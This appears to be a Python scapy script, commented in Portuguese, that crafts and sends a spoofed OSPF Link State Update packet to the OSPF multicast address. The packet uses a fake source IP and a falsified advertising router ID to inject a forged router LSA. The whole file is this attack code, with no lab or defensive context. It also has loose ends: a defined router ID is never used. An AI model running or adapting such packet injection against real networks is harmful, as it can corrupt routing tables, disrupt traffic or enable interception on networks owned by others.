from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.ospf import OSPF_Hdr, OSPF_LSA_Hdr, OSPF_LSUpd

# Configurações do pacote OSPF manipulado (valores em hexadecimal)
src_ip = "192.168.1.1"  # IP de origem falso
dst_ip = "224.0.0.5"  # IP de destino multicast OSPF
ospf_area = b'\x00\x00\x00\x01'  # Área OSPF em hexadecimal
router_id = "0x01010101"  # ID do roteador falsificado
ls_id = "0x02020202"  # LSID em hexadecimal
adv_router = "0x01010101"  # Roteador anunciante em hexadecimal
lsa_age = b'\x00\x01'  # Idade do LSA

# Construção do pacote OSPF com LSA (valores hexadecimais)
ospf_packet = (
    IP(src=src_ip, dst=dst_ip) /  # IP multicast OSPF
    OSPF_Hdr(area=ospf_area) /
    OSPF_LSUpd(lsalist=[
        OSPF_LSA_Hdr(
            age=int.from_bytes(lsa_age, byteorder="big"),
            type=1,  # Tipo de LSA: Roteador
            lsid=int(ls_id, 16),
            adv_router=int(adv_router, 16)
        )
    ])
)

# Envio do pacote manipulado
send(ospf_packet, verbose=1)

print("Pacote OSPF manipulado enviado.")
